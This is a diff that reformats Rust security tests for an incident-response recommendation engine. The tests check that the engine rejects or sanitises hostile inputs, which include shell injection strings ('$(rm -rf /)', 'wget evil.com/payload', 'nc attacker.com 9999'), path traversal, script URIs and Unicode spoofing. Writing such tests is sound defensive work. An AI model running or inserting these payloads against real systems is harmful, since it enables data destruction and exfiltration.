@@ -1537,16 +1537,27 @@ mod tests {
 
         for (i, attack_vector) in nan_attack_vectors.iter().enumerate() {
             // Should reject NaN values in validation
-            assert!(!attack_vector.is_valid(), "NaN attack vector {} should be invalid", i);
+            assert!(
+                !attack_vector.is_valid(),
+                "NaN attack vector {} should be invalid",
+                i
+            );
 
             // Total calculation should handle NaN safely
             let total = attack_vector.total();
-            assert!(total.is_nan() || total.is_finite(),
-                   "Total calculation should handle NaN safely for attack {}", i);
+            assert!(
+                total.is_nan() || total.is_finite(),
+                "Total calculation should handle NaN safely for attack {}",
+                i
+            );
 
             // Dominant dimension should handle NaN safely
             let dominant = attack_vector.dominant_dimension();
-            assert!(!dominant.is_empty(), "Dominant dimension should not be empty for attack {}", i);
+            assert!(
+                !dominant.is_empty(),
+                "Dominant dimension should not be empty for attack {}",
+                i
+            );
         }
 
         // Test infinity injection attacks
@@ -1569,26 +1580,34 @@ mod tests {
 
         for (i, attack_vector) in infinity_attack_vectors.iter().enumerate() {
             // Should reject infinite values
-            assert!(!attack_vector.is_valid(), "Infinity attack vector {} should be invalid", i);
+            assert!(
+                !attack_vector.is_valid(),
+                "Infinity attack vector {} should be invalid",
+                i
+            );
         }
 
         // Test precision manipulation attacks
-        let precision_attacks = vec![
-            ExpectedLossVector {
-                availability_loss: f64::MIN_POSITIVE,
-                integrity_loss: f64::EPSILON,
-                confidentiality_loss: 1.0000000000000002,  // Just above 1.0 in f64
-                financial_loss: f64::MAX / 16.0,
-                reputation_loss: 1e-308,
-            },
-        ];
+        let precision_attacks = vec![ExpectedLossVector {
+            availability_loss: f64::MIN_POSITIVE,
+            integrity_loss: f64::EPSILON,
+            confidentiality_loss: 1.0000000000000002, // Just above 1.0 in f64
+            financial_loss: f64::MAX / 16.0,
+            reputation_loss: 1e-308,
+        }];
 
         for attack_vector in precision_attacks {
             // Should handle precision edge cases
-            assert!(attack_vector.is_valid(), "Precision edge cases should be valid");
+            assert!(
+                attack_vector.is_valid(),
+                "Precision edge cases should be valid"
+            );
 
             let total = attack_vector.total();
-            assert!(total.is_finite(), "Total should remain finite for precision attacks");
+            assert!(
+                total.is_finite(),
+                "Total should remain finite for precision attacks"
+            );
             assert!(total >= 0.0, "Total should be non-negative");
         }
 
@@ -1604,8 +1623,10 @@ mod tests {
         // Should handle potential overflow gracefully
         assert!(!overflow_attack.is_valid());
         let total = overflow_attack.total();
-        assert!(total.is_infinite() || total.is_finite(),
-               "Overflow calculation should not produce NaN");
+        assert!(
+            total.is_infinite() || total.is_finite(),
+            "Overflow calculation should not produce NaN"
+        );
     }
 
     #[test]
@@ -1617,23 +1638,22 @@ mod tests {
         // Test injection through context values
         let context_injection_attacks = vec![
             // JSON injection in context values
-            ("operator_id", r#"{"injected":"admin","privilege":"escalated"}"#),
+            (
+                "operator_id",
+                r#"{"injected":"admin","privilege":"escalated"}"#,
+            ),
             ("session_token", "abc123\"},\"admin\":true,\"fake\":\""),
             ("request_id", "req-001\\\":{\\\"override\\\":true}//"),
-
             // Command injection patterns
             ("operator_action", "$(rm -rf /); echo legitimate"),
             ("target_system", "; cat /etc/passwd # legitimate"),
             ("rollback_target", "`wget evil.com/payload` && rollback"),
-
             // Path traversal in context
             ("log_file", "../../../../etc/passwd"),
             ("config_path", "..\\..\\..\\windows\\system32"),
-
             // Unicode injection attacks
-            ("operator_name", "admin\u{202E}resu\u{202D}"),  // BiDi override
-            ("description", "safe\u{200B}hidden\u{200C}injection"),  // Zero-width chars
-
+            ("operator_name", "admin\u{202E}resu\u{202D}"), // BiDi override
+            ("description", "safe\u{200B}hidden\u{200C}injection"), // Zero-width chars
             // Control character pollution
             ("command", "legitimate\x00\x01\x02malicious\x03"),
             ("evidence", "normal\r\nInjected: malicious\r\nreal"),
@@ -1658,17 +1678,32 @@ mod tests {
             match result {
                 Ok(recommendation) => {
                     // Verify no injection artifacts appear in recommendation
-                    assert!(!recommendation.primary_action.description.contains("injected"));
+                    assert!(
+                        !recommendation
+                            .primary_action
+                            .description
+                            .contains("injected")
+                    );
                     assert!(!recommendation.primary_action.description.contains("admin"));
-                    assert!(!recommendation.primary_action.description.contains("escalated"));
+                    assert!(
+                        !recommendation
+                            .primary_action
+                            .description
+                            .contains("escalated")
+                    );
                     assert!(!recommendation.primary_action.description.contains("$("));
                     assert!(!recommendation.primary_action.description.contains("rm -rf"));
-                    assert!(!recommendation.primary_action.description.contains("cat /etc/passwd"));
+                    assert!(
+                        !recommendation
+                            .primary_action
+                            .description
+                            .contains("cat /etc/passwd")
+                    );
 
                     // Rollback command should not contain injection
                     assert!(!recommendation.rollback_command.contains("evil.com"));
                     assert!(!recommendation.rollback_command.contains("payload"));
-                },
+                }
                 Err(_) => {
                     // Rejection is also acceptable for malicious input
                 }
@@ -1692,9 +1727,9 @@ mod tests {
         let mut engine = CopilotEngine::new();
 
         // Create request with massive number of allowed actions
-        let massive_actions: Vec<String> = (0..10000).map(|i| {
-            format!("action_{:05}_{}", i, "x".repeat(i % 100))
-        }).collect();
+        let massive_actions: Vec<String> = (0..10000)
+            .map(|i| format!("action_{:05}_{}", i, "x".repeat(i % 100)))
+            .collect();
 
         let complexity_attack_request = RecommendationRequest {
             operator_id: "complexity_attacker".to_string(),
@@ -1710,15 +1745,18 @@ mod tests {
         let duration = start_time.elapsed();
 
         // Should complete within reasonable time (5 seconds max)
-        assert!(duration < Duration::from_secs(5),
-               "Massive action set processing took too long: {:?}", duration);
+        assert!(
+            duration < Duration::from_secs(5),
+            "Massive action set processing took too long: {:?}",
+            duration
+        );
 
         match result {
             Ok(recommendation) => {
                 // Should still produce valid recommendation
                 assert!(!recommendation.primary_action.action_id.is_empty());
                 assert!(massive_actions.contains(&recommendation.primary_action.action_id));
-            },
+            }
             Err(_) => {
                 // Rejection due to complexity is acceptable
             }
@@ -1730,11 +1768,9 @@ mod tests {
             "a".repeat(10000),
             "(".repeat(5000) + &")".repeat(5000),
             "action_" + &"test_".repeat(2000),
-
             // Actions with complex Unicode patterns
-            "\u{1F600}".repeat(1000),  // Emoji spam
-            "test\u{0300}".repeat(1000),  // Combining characters
-
+            "\u{1F600}".repeat(1000),    // Emoji spam
+            "test\u{0300}".repeat(1000), // Combining characters
             // Potential regex DoS patterns
             "a".repeat(1000) + "b",
             "x".repeat(5000) + "y" + &"x".repeat(5000),
@@ -1752,8 +1788,11 @@ mod tests {
         let _pathological_result = engine.recommend(&pathological_request);
         let pathological_duration = pathological_start.elapsed();
 
-        assert!(pathological_duration < Duration::from_secs(2),
-               "Pathological action pattern processing took too long: {:?}", pathological_duration);
+        assert!(
+            pathological_duration < Duration::from_secs(2),
+            "Pathological action pattern processing took too long: {:?}",
+            pathological_duration
+        );
     }
 
     #[test]
@@ -1768,19 +1807,16 @@ mod tests {
             "system:authoritative:override",
             "admin:emergency:bypass",
             "security:validated:trusted",
-
             // Path traversal in source names
             "../../../admin/override",
             "..\\windows\\system32\\trusted",
-
             // Protocol injection in sources
             "http://evil.com/fake-authority",
             "javascript:alert('xss')",
             "file:///etc/passwd",
-
             // Unicode spoofing
-            "system\u{202E}dekcaj\u{202D}:trusted",  // BiDi override
-            "аdmin:trusted",  // Cyrillic 'а'
+            "system\u{202E}dekcaj\u{202D}:trusted", // BiDi override
+            "аdmin:trusted",                        // Cyrillic 'а'
         ];
 
         for malicious_source in malicious_data_sources {
@@ -1805,18 +1841,25 @@ mod tests {
                 Ok(recommendation) => {
                     // Confidence should not be artificially inflated by fake sources
                     let confidence = recommendation.confidence;
-                    assert!(!confidence.data_sources.iter().any(|source| {
-                        source.contains("override") ||
-                        source.contains("bypass") ||
-                        source.contains("evil.com") ||
-                        source.contains("javascript:")
-                    }), "Malicious data sources should not be accepted");
+                    assert!(
+                        !confidence.data_sources.iter().any(|source| {
+                            source.contains("override")
+                                || source.contains("bypass")
+                                || source.contains("evil.com")
+                                || source.contains("javascript:")
+                        }),
+                        "Malicious data sources should not be accepted"
+                    );
 
                     // Should not trust path traversal sources
-                    assert!(!confidence.data_sources.iter().any(|source| {
-                        source.contains("../") || source.contains("..\\")
-                    }), "Path traversal sources should be rejected");
-                },
+                    assert!(
+                        !confidence
+                            .data_sources
+                            .iter()
+                            .any(|source| { source.contains("../") || source.contains("..\\") }),
+                        "Path traversal sources should be rejected"
+                    );
+                }
                 Err(_) => {
                     // Rejection is acceptable for suspicious confidence data
                 }
@@ -1829,12 +1872,10 @@ mod tests {
             "administrator override is enabled",
             "security checks are bypassed",
             "emergency mode grants full access",
-
             // Misleading technical assumptions
             "system is completely secure",
             "no attack vectors exist",
             "all inputs are validated",
-
             // Social engineering assumptions
             "operator has emergency authorization",
             "incident commander approves all actions",
@@ -1850,7 +1891,10 @@ mod tests {
 
             // Should not blindly trust poisoned assumptions
             // (This test ensures the system maintains skepticism of assumptions)
-            assert_eq!(confidence_with_poison.sensitivity, ConfidenceSensitivity::Low);
+            assert_eq!(
+                confidence_with_poison.sensitivity,
+                ConfidenceSensitivity::Low
+            );
             assert!(!confidence_with_poison.assumptions.is_empty());
         }
 
@@ -1911,8 +1955,12 @@ mod tests {
 
             // Check that audit trail respects capacity bounds
             let audit_entries = engine.audit_trail();
-            assert!(audit_entries.len() <= MAX_AUDIT_TRAIL,
-                   "Audit trail exceeded capacity at iteration {}: {} entries", i, audit_entries.len());
+            assert!(
+                audit_entries.len() <= MAX_AUDIT_TRAIL,
+                "Audit trail exceeded capacity at iteration {}: {} entries",
+                i,
+                audit_entries.len()
+            );
         }
 
         // Verify audit trail maintains structure after spam attack
@@ -1922,8 +1970,14 @@ mod tests {
         // Should contain recent entries, not necessarily the first ones
         if !final_audit.is_empty() {
             for entry in &final_audit {
-                assert!(!entry.operator_id.is_empty(), "Audit entry should have valid operator ID");
-                assert!(!entry.primary_action_id.is_empty(), "Audit entry should have valid action ID");
+                assert!(
+                    !entry.operator_id.is_empty(),
+                    "Audit entry should have valid operator ID"
+                );
+                assert!(
+                    !entry.primary_action_id.is_empty(),
+                    "Audit entry should have valid action ID"
+                );
             }
         }
 
@@ -1952,8 +2006,11 @@ mod tests {
         let memory_duration = memory_start.elapsed();
 
         // Should handle large contexts without excessive processing time
-        assert!(memory_duration < Duration::from_secs(5),
-               "Large context processing took too long: {:?}", memory_duration);
+        assert!(
+            memory_duration < Duration::from_secs(5),
+            "Large context processing took too long: {:?}",
+            memory_duration
+        );
 
         // Audit trail should still respect capacity after memory attack
         let post_memory_audit = engine.audit_trail();
@@ -1975,21 +2032,17 @@ mod tests {
             "normal | nc attacker.com 9999",
             "safe $(echo malicious)",
             "action `cat sensitive.file`",
-
             // Path traversal in action IDs
             "../../../admin/escalate",
             "..\\..\\..\\windows\\system32\\cmd",
-
             // Protocol injection
             "http://evil.com/action",
             "file:///etc/passwd#action",
             "javascript:alert('xss')",
-
             // Unicode injection and spoofing
             "action\u{202E}tpircs\u{202D}", // BiDi override
-            "аction",  // Cyrillic 'а'
+            "аction",                       // Cyrillic 'а'
             "action\u{200B}hidden\u{200C}command",
-
             // Control character injection
             "action\x00\x01\x02",
             "legitimate\r\nmalicious_command\r\nlegit",
@@ -2031,8 +2084,13 @@ mod tests {
                     // Primary action should be sanitized
                     assert!(!recommendation.primary_action.action_id.contains("; "));
                     assert!(!recommendation.primary_action.action_id.contains("&& "));
-                    assert!(!recommendation.primary_action.description.contains("malicious"));
-                },
+                    assert!(
+                        !recommendation
+                            .primary_action
+                            .description
+                            .contains("malicious")
+                    );
+                }
                 Err(_) => {
                     // Rejection of suspicious action IDs is acceptable
                 }
@@ -2077,14 +2135,24 @@ mod tests {
                 Ok(recommendation) => {
                     // Recommendation should be normal, not privileged
                     assert!(!recommendation.primary_action.description.contains("admin"));
-                    assert!(!recommendation.primary_action.description.contains("privileged"));
-                    assert!(!recommendation.primary_action.description.contains("escalated"));
+                    assert!(
+                        !recommendation
+                            .primary_action
+                            .description
+                            .contains("privileged")
+                    );
+                    assert!(
+                        !recommendation
+                            .primary_action
+                            .description
+                            .contains("escalated")
+                    );
 
                     // Rollback should not contain privileged operations
                     assert!(!recommendation.rollback_command.contains("sudo"));
                     assert!(!recommendation.rollback_command.contains("admin"));
                     assert!(!recommendation.rollback_command.contains("root"));
-                },
+                }
                 Err(_) => {
                     // Rejection is also acceptable
                 }
@@ -2113,7 +2181,6 @@ mod tests {
             ("admin_override", Urgency::High),
             ("disable_monitoring", Urgency::Medium),
             ("grant_access", Urgency::High),
-
             // Seemingly legitimate actions with potential for abuse
             ("restart_service", Urgency::Critical),
             ("clear_logs", Urgency::Medium),
@@ -2154,8 +2221,11 @@ mod tests {
             match (degraded_result, normal_result) {
                 (Ok(degraded_rec), Ok(normal_rec)) => {
                     // Degraded mode recommendation should not be significantly less secure
-                    assert!(degraded_rec.expected_loss.total() >= normal_rec.expected_loss.total() * 0.5,
-                           "Degraded mode should not dramatically reduce expected loss calculations");
+                    assert!(
+                        degraded_rec.expected_loss.total()
+                            >= normal_rec.expected_loss.total() * 0.5,
+                        "Degraded mode should not dramatically reduce expected loss calculations"
+                    );
 
                     // Should still maintain audit trails in degraded mode
                     assert!(!degraded_rec.primary_action.description.is_empty());
@@ -2164,7 +2234,7 @@ mod tests {
                     if degraded_rec.confidence.sensitivity != ConfidenceSensitivity::None {
                         // Degraded mode should reflect uncertainty
                     }
-                },
+                }
                 (Err(_), _) | (_, Err(_)) => {
                     // Rejection in either mode is acceptable for dangerous actions
                 }
@@ -2200,7 +2270,7 @@ mod tests {
                     if let Some(latest) = audit.last() {
                         assert_eq!(latest.degraded_mode, degraded_state);
                     }
-                },
+                }
                 Err(_) => {
                     // Errors are acceptable in either mode
                 }
@@ -2221,7 +2291,10 @@ mod tests {
 
             // Should handle rapid mode changes without state corruption
             let audit = engine.audit_trail();
-            assert!(audit.len() <= MAX_AUDIT_TRAIL, "Audit trail should remain bounded during rapid toggling");
+            assert!(
+                audit.len() <= MAX_AUDIT_TRAIL,
+                "Audit trail should remain bounded during rapid toggling"
+            );
         }
     }
 
@@ -2280,17 +2353,32 @@ mod tests {
             match result {
                 Ok(recommendation) => {
                     // Each recommendation should be self-consistent
-                    assert!(!recommendation.primary_action.action_id.is_empty(),
-                           "Recommendation {} should have valid action ID", i);
-                    assert!(!recommendation.primary_action.description.is_empty(),
-                           "Recommendation {} should have valid description", i);
-                    assert!(recommendation.expected_loss.is_valid(),
-                           "Recommendation {} should have valid expected loss", i);
+                    assert!(
+                        !recommendation.primary_action.action_id.is_empty(),
+                        "Recommendation {} should have valid action ID",
+                        i
+                    );
+                    assert!(
+                        !recommendation.primary_action.description.is_empty(),
+                        "Recommendation {} should have valid description",
+                        i
+                    );
+                    assert!(
+                        recommendation.expected_loss.is_valid(),
+                        "Recommendation {} should have valid expected loss",
+                        i
+                    );
 
                     // Should not contain artifacts from other concurrent requests
-                    assert!(!recommendation.primary_action.description.contains("concurrent_op"),
-                           "Recommendation {} should not leak operator IDs", i);
-                },
+                    assert!(
+                        !recommendation
+                            .primary_action
+                            .description
+                            .contains("concurrent_op"),
+                        "Recommendation {} should not leak operator IDs",
+                        i
+                    );
+                }
                 Err(_) => {
                     // Errors are acceptable under race conditions
                 }
@@ -2303,8 +2391,16 @@ mod tests {
 
         // Check for audit trail consistency
         for (i, entry) in audit_trail.iter().enumerate() {
-            assert!(!entry.operator_id.is_empty(), "Audit entry {} should have operator ID", i);
-            assert!(!entry.primary_action_id.is_empty(), "Audit entry {} should have action ID", i);
+            assert!(
+                !entry.operator_id.is_empty(),
+                "Audit entry {} should have operator ID",
+                i
+            );
+            assert!(
+                !entry.primary_action_id.is_empty(),
+                "Audit entry {} should have action ID",
+                i
+            );
 
             // Should not contain mixed state from different requests
             if entry.operator_id == "concurrent_op_1" {
@@ -2334,11 +2430,9 @@ mod tests {
             // Update with different urgency
             ("urgency", "critical"),
             ("urgency", "low"),
-
             // Update with conflicting mode
             ("degraded_mode", "true"),
             ("degraded_mode", "false"),
-
             // Update with suspicious values
             ("operator", "admin"),
             ("action", "emergency_override"),
